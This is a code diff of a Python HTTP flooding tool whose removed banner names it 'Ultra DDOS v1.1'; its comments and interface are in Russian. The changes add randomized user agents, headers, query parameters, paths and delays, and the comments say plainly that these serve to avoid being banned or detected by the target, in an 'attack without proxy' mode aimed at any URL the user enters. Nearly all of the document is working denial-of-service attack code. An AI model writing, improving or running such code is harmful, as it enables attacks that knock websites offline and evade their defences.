@@ -6,92 +6,84 @@ import json
 import threading
 import requests
 from datetime import datetime
+from urllib.parse import urlparse
 
 # ================= НАСТРОЙКИ =================
-MAX_THREADS = 50
-TIMEOUT = 3
+MAX_THREADS = 30  # Умеренно, чтобы не забанили
+TIMEOUT = 5
+REQUEST_DELAY_MIN = 0.05  # Минимальная задержка
+REQUEST_DELAY_MAX = 0.3   # Максимальная задержка
 
-# ================= ЗЕЛЁНЫЙ ГРАДИЕНТ =================
-G1 = "\033[38;2;0;60;0m"
-G2 = "\033[38;2;0;90;0m"
-G3 = "\033[38;2;0;120;0m"
-G4 = "\033[38;2;0;160;0m"
-G5 = "\033[38;2;0;200;0m"
-G6 = "\033[38;2;0;230;0m"
-G7 = "\033[38;2;50;255;50m"
-GW = "\033[38;2;200;255;200m"
+# ================= USER-AGENT =================
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
+    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
+    # Добавьте ещё 50+ своих
+]
 
-R = "\033[91m"
+# ================= ЦВЕТА =================
 G = "\033[92m"
+R = "\033[91m"
 Y = "\033[93m"
 C = "\033[96m"
 W = "\033[97m"
 E = "\033[0m"
-
-# ================= СТАТИСТИКА =================
-def load_stats():
-    try:
-        with open('stats.json', 'r') as f:
-            return json.load(f)
-    except:
-        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}
-
-def save_stats(s):
-    with open('stats.json', 'w') as f:
-        json.dump(s, f, indent=4)
-
-def save_history(entry):
-    try:
-        with open('history.json', 'r') as f:
-            h = json.load(f)
-    except:
-        h = []
-    h.append(entry)
-    if len(h) > 100:
-        h = h[-100:]
-    with open('history.json', 'w') as f:
-        json.dump(h, f, indent=4)
+G7 = "\033[38;2;50;255;50m"
 
 # ================= ВСПОМОГАТЕЛЬНЫЕ =================
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
-
-def safe_int(prompt, default=30, min_val=1, max_val=50):
-    while True:
-        u = input(prompt)
-        if u == "":
-            return default
-        try:
-            v = int(u)
-            if min_val <= v <= max_val:
-                return v
-        except:
-            pass
 
 def bar(p, w=20):
     p = max(0, min(100, p))
     f = int(w * p / 100)
     return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"
 
-# ================= БАННЕР =================
-def banner():
-    clear()
-    print(f"""
-{G1} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {E}
-{G2}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {E}
-{G3}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {E}
-{G4}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{E}
-{G5}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{E}
-{G6}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{E}
-{G5}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{E}
-{G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}
-{G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}
-{G1}                                               ░       ░                           {E}
-{G7}Ultra DDOS v1.1 | Developer: verifactor @newince
-{E}
-""")
+def random_headers():
+    """Генерирует случайные заголовки"""
+    return {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Accept': random.choice(['*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json']),
+        'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'de-DE,de;q=0.8,en;q=0.7']),
+        'Accept-Encoding': random.choice(['gzip, deflate', 'gzip', 'deflate', 'br']),
+        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
+        'Connection': random.choice(['keep-alive', 'close']),
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script', 'style']),
+        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
+        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
+    }
 
-# ================= HTTP-АТАКА =================
+def random_params():
+    """Случайные параметры для URL"""
+    return {
+        't': random.randint(1000, 9999),
+        'r': random.random(),
+        'sid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=8)),
+        'v': random.randint(1, 5),
+        'cb': str(random.randint(100000, 999999))
+    }
+
+def random_path(base_url):
+    """Добавляет случайный путь к URL"""
+    paths = ['/', '/index.html', '/api/v1/test', '/images/logo.png', '/css/style.css', 
+             '/js/script.js', '/favicon.ico', '/robots.txt', '/sitemap.xml',
+             '/wp-content/themes/twentythree/style.css', '/static/js/main.js']
+    parsed = urlparse(base_url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    return base + random.choice(paths)
+
+# ================= АТАКА С АНТИ-БАНОМ =================
 class Attack:
     def __init__(self):
         self.running = False
@@ -102,20 +94,48 @@ class Attack:
         self.bytes = 0
         self.start = 0
         self.lock = threading.Lock()
-
-    def http_worker(self, url):
+        self.session = requests.Session()
+    
+    def http_worker(self, base_url):
         try:
-            r = requests.get(url, timeout=3)
+            # Рандомный URL с параметрами
+            url = random_path(base_url)
+            params = random_params()
+            headers = random_headers()
+            
+            # Задержка чтобы не спалить
+            time.sleep(random.uniform(REQUEST_DELAY_MIN, REQUEST_DELAY_MAX))
+            
+            # Отправка запроса
+            response = self.session.get(
+                url,
+                params=params,
+                headers=headers,
+                timeout=TIMEOUT,
+                allow_redirects=True
+            )
+            
             with self.lock:
                 self.req += 1
-                self.bytes += len(r.content)
-                if r.status_code in [200, 301, 302, 404]:
+                self.bytes += len(response.content)
+                
+                # Разные коды ответа
+                if response.status_code in [200, 301, 302, 304, 404]:
                     self.ok += 1
-                elif r.status_code in [403, 429, 503]:
+                elif response.status_code in [403, 429, 503, 401]:
                     self.ban += 1
                     self.err += 1
                 else:
                     self.err += 1
+                    
+        except requests.exceptions.Timeout:
+            with self.lock:
+                self.req += 1
+                self.err += 1
+        except requests.exceptions.ConnectionError:
+            with self.lock:
+                self.req += 1
+                self.err += 1
         except:
             with self.lock:
                 self.req += 1
@@ -129,7 +149,6 @@ class Attack:
         def worker():
             while self.running:
                 self.http_worker(url)
-                time.sleep(random.uniform(0.001, 0.01))
         
         threads_list = []
         for _ in range(threads):
@@ -146,61 +165,70 @@ class Attack:
     def stop(self):
         self.running = False
 
-# ================= ВЫВОД (БЕЗ МЕРЦАНИЯ - ТОЛЬКО ЦИФРЫ) =================
+# ================= ВЫВОД =================
 def attack_view_smooth(url, threads, a, prev_data=None):
     elapsed = int(time.time() - a.start)
     rate = int(a.req / elapsed) if elapsed > 0 else 0
-    load = min(100, int((rate / (threads * 3)) * 100)) if threads > 0 else 0
-    stats = load_stats()
+    load = min(100, int((rate / (threads * 10)) * 100)) if threads > 0 else 0
     
-    # Данные для сравнения
-    data = {
-        'req': a.req, 'ok': a.ok, 'err': a.err, 'ban': a.ban,
-        'bytes': a.bytes, 'elapsed': elapsed, 'rate': rate, 'load': load
-    }
+    data = {'req': a.req, 'ok': a.ok, 'err': a.err, 'ban': a.ban,
+            'bytes': a.bytes, 'elapsed': elapsed, 'rate': rate, 'load': load}
     
-    # Если ничего не изменилось - не обновляем
     if prev_data and data == prev_data:
         return data
     
-    # Полная перерисовка (но без мерцания - через ANSI-код)
-    sys.stdout.write('\033[H\033[J')  # Очистка без мерцания
+    sys.stdout.write('\033[H\033[J')
     sys.stdout.flush()
     
     output = f"""
-{G7}HTTP АТАКА В ПРОЦЕССЕ
+{G7}⚠ АТАКА БЕЗ ПРОКСИ (АНТИ-БАН РЕЖИМ)
 
-{G6}Цель      : {W}{url[:30]}
-{G5}Потоки    : {W}{threads}  [{bar(load)}]
-{G4}Запросы   : {W}{a.req:,}
-{G3}Скорость  : {W}{rate:,} r/s
-{G4}Успешно   : {G}{a.ok:,}{E}
-{G5}Ошибки    : {R}{a.err:,}{E}
-{G6}Бан       : {R}{a.ban}{E}
-{G6}Время     : {W}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
-{G5}Данные    : {W}{a.bytes/1024/1024:.1f} MB
-{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{G3}Всего атак за сессию : {W}{stats['attacks']}
-{G2}Всего запросов       : {W}{stats['requests']:,}
-{G3}Всего успешно        : {G}{stats['success']:,}{E}
-{G4}Всего ошибок         : {R}{stats['errors']:,}{E}
+{C}Цель      : {W}{url[:40]}
+{C}Потоки    : {W}{threads}  [{bar(load)}]
+{C}Запросы   : {W}{a.req:,}
+{C}Скорость  : {W}{rate:,} r/s
+{G}✅ Успешно : {W}{a.ok:,}
+{R}❌ Ошибки  : {W}{a.err:,}
+{Y}🚫 Бан     : {W}{a.ban}
+{C}Время     : {W}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
+{C}Данные    : {W}{a.bytes/1024/1024:.1f} MB
+
+{Y}💡 Стратегия защиты:
+   • Случайные User-Agent ({len(USER_AGENTS)} шт.)
+   • Случайные заголовки
+   • Случайные параметры
+   • Случайные пути
+   • Задержки {REQUEST_DELAY_MIN}-{REQUEST_DELAY_MAX} сек
+
 {G7}[Press ENTER to stop]
 {E}
 """
     sys.stdout.write(output)
     sys.stdout.flush()
-    
     return data
 
 # ================= ЗАПУСК =================
 def run_test():
     clear()
-    banner()
-    print(f"{G7}HTTP НАГРУЗКА{E}")
-    url = input(f"{G6}Цель: {W}")
+    print(f"""
+{G7}⚠ АТАКА БЕЗ ПРОКСИ
+
+{Y}ВНИМАНИЕ: Используется ваш реальный IP!
+{C}Рекомендуется:
+   • 10-30 потоков
+   • Задержки между запросами
+   • Рандомизация всех параметров
+
+{G7}Нажми ENTER для продолжения...{E}
+""")
+    input()
+    
+    url = input(f"{C}Цель: {W}")
     if not url.startswith('http'):
         url = 'http://' + url
-    threads = safe_int(f"{G5}Потоки (1-{MAX_THREADS}): {W}", 30, 1, MAX_THREADS)
+    
+    threads = 30  # Оптимально для без прокси
+    print(f"{C}Потоки: {W}{threads} (оптимально)")
     
     a = Attack()
     t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
@@ -224,35 +252,15 @@ def run_test():
     a.stop()
     t.join(timeout=0.5)
     
-    elapsed = int(time.time() - a.start)
-    entry = {
-        "target": url, "threads": threads, "duration": elapsed,
-        "requests": a.req, "success": a.ok, "errors": a.err,
-        "banned": a.ban, "bytes_sent": a.bytes,
-        "avg_rate": int(a.req / elapsed) if elapsed > 0 else 0,
-        "timestamp": datetime.now().isoformat()
-    }
-    save_history(entry)
-    s = load_stats()
-    s["attacks"] += 1
-    s["requests"] += a.req
-    s["success"] += a.ok
-    s["errors"] += a.err
-    save_stats(s)
-    
     clear()
-    banner()
     print(f"""
 {G7}АТАКА ЗАВЕРШЕНА
 
-{G6}Запросы: {W}{a.req:,}
-{G5}Успешно: {G}{a.ok:,}{E}
-{G4}Ошибки : {R}{a.err:,}{E}
-{G3}Бан    : {R}{a.ban}{E}
-{G2}Время  : {W}{elapsed} сек
-{G1}Скорость: {W}{int(a.req/elapsed) if elapsed>0 else 0} r/s
-{G2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{G3}Всего атак за сессию: {W}{load_stats()['attacks']}
+{G}✅ Успешно: {a.ok:,}
+{R}❌ Ошибки: {a.err:,}
+{Y}🚫 Бан: {a.ban}
+{C}Всего: {a.req:,}
+{C}Время: {int(time.time() - a.start)} сек
 {E}
 """)
     input(f"{G7}Нажми ENTER для возврата...{E}")
@@ -260,12 +268,11 @@ def run_test():
 # ================= МЕНЮ =================
 def menu():
     clear()
-    banner()
     print(f"""
 {G7}ГЛАВНОЕ МЕНЮ
 
-{G6}1.{W} HTTP Load Test
-{G5}99.{W} Exit
+{C}1.{W} Атака без прокси (анти-бан)
+{C}99.{W} Exit
 {E}
 """)
 
